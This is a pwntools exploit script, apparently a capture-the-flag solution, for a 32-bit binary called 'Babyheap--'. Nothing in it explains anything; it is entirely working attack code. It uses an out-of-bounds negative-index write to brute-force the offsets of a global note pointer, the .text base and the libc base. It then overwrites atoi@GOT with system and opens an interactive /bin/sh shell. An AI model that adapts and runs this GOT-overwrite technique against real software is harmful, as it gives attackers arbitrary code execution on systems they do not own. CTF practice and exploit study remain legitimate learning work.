#!/usr/bin/env python3
from pwn import *

def write(entry, data):
    p.sendafter(b'entry :', str(entry))
    p.sendafter(b'data :', data)

p = process('./Babyheap--')

count = 0

idx = 0x1a0 // 4
idx += 1

# Brute-Force index of global variable 'note'
while True:
    write(-idx , b'GG')

    data = p.recvuntil(b'data :', timeout=3)

    if b'data :' not in data:
        break

    p.sendline(b'GG')

    idx += (0x1000 // 4)
    count += 1

# print(count)

note_idx = -((0x1a0 + 0x1000 * (count + 1) - 0x30) // 4)

# print(note_idx)

write(note_idx, b'\x60\x61\x61\x61')

# Brute-Force .text section
text = 0x55000500

write(1, b'1')
p.recvuntil(b'data :', timeout=1)

while True:
    p.send(str(-((0x61616160 - text) // 4)))
    p.sendafter(b'data :', 'a')

    data = p.recvuntil(b'data :', timeout=3)

    if b'data :' not in data:
        break

    text += 0x1000

text = text - 0x500
atoi_got = text + 0x20
print(hex(text))

# Brute-Force libc
libc = 0xf7000000

write(1, b'1')
p.recvuntil(b'data :', timeout=1)

while True:
    p.send(str(-((0x61616160 - libc) // 4)))
    p.sendafter(b'data :', 'a')

    data = p.recvuntil(b'data :', timeout=3)

    if b'data :' not in data:
        break

    libc += 0x1000

libc = libc - 0x1f3000
system = libc + 0x46360
libc_write = libc + 0xf7920
print(hex(libc))

# Overwrite atoi@got
write(-((0x61616160 - atoi_got) // 4), p32(system))
p.send(b'/bin/sh\0')

# Pwned
p.sendline(b'whoami')
p.sendline(b'id')

p.interactive()
